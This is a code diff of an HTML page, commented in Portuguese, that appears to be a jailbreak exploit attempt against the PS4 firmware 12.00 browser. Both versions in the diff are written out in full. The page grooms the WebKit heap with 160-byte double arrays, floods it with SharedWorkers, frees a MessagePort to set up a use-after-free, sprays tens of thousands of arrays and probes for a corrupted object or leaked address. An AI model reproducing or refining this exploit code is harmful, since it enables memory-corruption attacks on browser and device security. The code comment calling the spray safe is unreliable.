@@ -2,132 +2,199 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 ISOHEAP BREAKER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 12.00 TARGET 0xA0</title>
     
 </head>
 <body>
 
-    <h1>ISOHEAP BREAKER</h1>
-    <h3>Estratégia: Poluição de Heap Múltipla</h3>
-    <div id="status">Aguardando...</div>
-    <div id="log"></div>
-    
-    <button onclick="run_breaker()">INICIAR QUEBRA</button>
+    <h1>PS4 12.00 - ALVO: 0xA0 (160 bytes)</h1>
+    <h3>Estratégia: Butterfly Spray (Lapse Style)</h3>
+
+    <button onclick="start_exploit()">INICIAR TESTE</button>
+
+    <div id="log">Sistema pronto.</div>
 
     <script>
-        function log(msg) {
+        // =================================================================
+        // 1. CONFIGURAÇÕES REAIS
+        // =================================================================
+        // Foco total no 0xA0 que encontramos no binário
+        const TARGET_SIZE = 0xA0; 
+        
+        // Limite de segurança (403)
+        const WORKER_LIMIT = 403;
+        
+        // Spray massivo para garantir cobertura
+        const SPRAY_QUANTITY = 30000;
+
+        // =================================================================
+        // 2. SISTEMA DE LOG
+        // =================================================================
+        function log(msg, type = "info") {
             var d = document.getElementById("log");
-            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            var color = "#7d8590";
+            if (type === "success") color = "#2ea043";
+            if (type === "fail") color = "#f85149";
+            if (type === "leak") color = "#d29922";
+
+            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
         // =================================================================
-        // 1. MULTI-PAYLOADS (Vários Tamanhos)
+        // 3. GERENCIAMENTO DE MEMÓRIA (HEAP)
         // =================================================================
-        // O bmalloc alinha em 16 bytes. Vamos criar payloads para todas as classes prováveis.
-        
-        function get_payload(size) {
-            // Cria um Double Array que ocupe exatamente 'size' bytes na memória
-            // Header do Array ~= 16 bytes
-            var elements = (size - 16) / 8;
-            var arr = new Array(Math.floor(elements));
-            for(var i=0; i<arr.length; i++) arr[i] = 1.1; // Marker 0x3FF1...
+        var grooming_stash = [];
+
+        function prepare_heap() {
+            log(`HEAP: Preparando buracos de 0x${TARGET_SIZE.toString(16)} (Checkerboard)...`);
+            grooming_stash = [];
+            
+            // Cálculo para Double Array (Butterfly):
+            // Tamanho Total = Header (16) + (Elementos * 8)
+            // Para 160 bytes (0xA0): (160 - 16) / 8 = 18 elementos
+            const elementCount = 18; 
+            
+            let temp = [];
+            // Aloca 3000 buffers
+            for (let i = 0; i < 3000; i++) {
+                let arr = new Array(elementCount);
+                arr.fill(1.1); // Preenche com Doubles para garantir Butterfly
+                temp.push(arr);
+            }
+
+            // Libera alternado (1 sim, 1 não) para criar o padrão de queijo suíço
+            // O Worker 403 deve cair num desses buracos
+            let holes = 0;
+            for (let i = 0; i < temp.length; i += 2) {
+                temp[i] = null; // Libera para o GC
+                holes++;
+            }
+            
+            // Mantém os vizinhos vivos
+            grooming_stash = temp.filter(x => x !== null);
+            log(`HEAP: ${holes} buracos preparados.`, "success");
+        }
+
+        // =================================================================
+        // 4. PAYLOAD (DOUBLE ARRAY)
+        // =================================================================
+        function build_payload() {
+            const elementCount = 18; // (160 - 16) / 8
+            const arr = new Array(elementCount);
+            
+            // Valor Marcador: 1.1 (0x3FF199999999999A)
+            // Se o kernel ler isso como ponteiro, aponta para Userland (seguro).
+            // Se o JS ler isso de volta num objeto corrompido, saberemos.
+            for(let i=0; i<arr.length; i++) {
+                arr[i] = 1.1; 
+            }
+            
             return arr;
         }
 
-        // Tamanhos de balde do WebKit (IsoHeap Buckets)
-        var BUCKETS = [
-            0x80, 0x90, 0xA0, 0xB0, 
-            0xC0, 0xD0, 0xE0, 0xF0, 
-            0x100, 0x120, 0x140
-        ];
+        // =================================================================
+        // 5. EXECUÇÃO (TRIGGER)
+        // =================================================================
+        var workers_stash = [];
+        var is_running = false;
 
-        var workers = [];
-
-        async function run_breaker() {
-            if(!window.SharedWorker) return log("Erro: Navegador.");
-
-            log(">>> INICIANDO ATAQUE MULTI-BUCKET <<<");
+        async function start_exploit() {
+            if (is_running) return;
+            if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
             
-            // 1. PREPARAÇÃO: Criar "lixo" em todos os tamanhos
-            // Para "aquecer" os alocadores de todos os tamanhos
-            log("Aquecendo alocadores...");
-            var trash = [];
-            for(let s of BUCKETS) {
-                for(let k=0; k<100; k++) trash.push(get_payload(s));
-            }
+            is_running = true;
+            log(`>>> INICIANDO (Alvo: 0x${TARGET_SIZE.toString(16)}) <<<`, "leak");
+
+            // 1. Preparar Memória
+            prepare_heap();
             
-            // 2. GROOMING (400)
-            log("Grooming (400)...");
-            for(let i=0; i<400; i++) {
-                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
+            // 2. Payload
+            const payload = build_payload();
+
+            // 3. Grooming (Base)
+            workers_stash = [];
+            log("Grooming Workers (380)...");
+            for(let i=0; i<380; i++) {
+                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
             }
 
-            // 3. TRIGGER (403 -> 405)
-            var p_count = 0;
-            var limit = 405 - 400; // Vamos ser agressivos
+            // 4. Trigger Loop
+            let p_count = 0;
+            const limit = WORKER_LIMIT - 380;
 
-            var it = setInterval(() => {
+            var interval = setInterval(() => {
                 if (p_count >= limit) {
-                    clearInterval(it);
+                    clearInterval(interval);
                     
-                    // Vítima Final
-                    var v = workers.pop();
-                    var p = v.port;
-                    v.port.close(); // UAF
+                    // O ÚLTIMO (403) - A VÍTIMA
+                    const victim = workers_stash.pop();
                     
-                    // 4. SPRAY "METRALHADORA"
-                    // Em vez de sprayar só um tamanho, sprayamos TODOS ao mesmo tempo.
-                    // Um deles tem que encaixar no buraco.
-                    log("DISPARANDO SPRAY MÚLTIPLO...");
+                    attempt_leak(victim, payload);
                     
-                    var spray_matrix = [];
-                    // Fazemos 5000 cópias de CADA tamanho possível
-                    // Isso vai consumir uns 100MB de RAM (seguro)
-                    for(let s of BUCKETS) {
-                        var pload = get_payload(s);
-                        for(let k=0; k<2000; k++) {
-                            // Usamos slice para clonar rápido
-                            spray_matrix.push(pload.slice(0));
-                        }
-                    }
-
-                    // 5. CHECK
-                    setTimeout(() => {
-                        try {
-                            var s = p.toString();
-                            if (s.indexOf("MessagePort") === -1) {
-                                log("!!! SUCESSO !!!", "#0f0");
-                                log("Objeto Corrompido: " + s, "#0f0");
-                                alert("LEAK OBTIDO! O IsoHeap foi quebrado.");
-                            } else {
-                                log("Falha: Objeto intacto.");
-                                // Tenta forçar erro
-                                try { let x = p.onmessage; } catch(e) {
-                                    if(e.toString().match(/0x/)) alert("LEAK NO ERRO!");
-                                }
-                            }
-                        } catch(e) {
-                            log("Erro na leitura: " + e);
-                        }
-                        
-                        // Limpeza
-                        workers.forEach(w=>{try{w.port.close()}catch(e){}});
-                        trash = null;
-                        spray_matrix = null;
-                        
-                    }, 1000);
-                    
+                    is_running = false;
                     return;
                 }
-                
+
                 try {
-                    let w = new SharedWorker("data:text,1", "v"+p_count);
+                    let w = new SharedWorker("data:text,1", "v_"+p_count);
                     w.port.start();
-                    workers.push(w);
-                } catch(e){}
+                    workers_stash.push(w);
+                    
+                    if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
+                } catch(e) {}
+                
                 p_count++;
-            }, 100);
+            }, 60); // Rápido o suficiente para não perder o slot
+        }
+
+        function attempt_leak(victim, payload) {
+            log("!!! DISPARANDO SWAP (0xA0) !!!", "leak");
+            
+            const port = victim.port;
+            
+            // 1. FREE
+            victim.port.close();
+            
+            // 2. SPRAY (Imediato)
+            // Usamos slice() para clonar o array rapidamente e inundar o heap
+            const spray = [];
+            for (let k = 0; k < SPRAY_QUANTITY; k++) {
+                spray.push(payload.slice(0));
+            }
+
+            // 3. VERIFICAÇÃO
+            setTimeout(() => {
+                try {
+                    const s = port.toString();
+                    
+                    // Se o objeto foi sobrescrito, ele não deve ser mais [object MessagePort]
+                    if (s.indexOf("MessagePort") === -1) {
+                        log("!!! SUCESSO ABSOLUTO !!!", "leak");
+                        log("Objeto Corrompido: " + s, "leak");
+                        alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
+                    } else {
+                        log("Falha: Objeto intacto [object MessagePort].");
+                        
+                        // Teste de estresse: tentar acessar propriedade
+                        // Se o vtable estiver sujo com 1.1, isso deve causar um crash controlado ou erro
+                        try { let temp = port.onmessage; } catch(e) {
+                            if(e.toString().match(/0x/)) {
+                                log("LEAK NO ERRO: " + e, "leak");
+                                alert("LEAK NO ERRO!");
+                            }
+                        }
+                    }
+                } catch (e) {
+                    // Erros aqui são Ouro
+                    log("ERRO CAPTURADO: " + e, "leak");
+                    alert("ERRO CAPTURADO (LEAK): " + e);
+                }
+                
+                // Limpeza
+                workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
+            }, 500);
         }
     </script>
 </body>
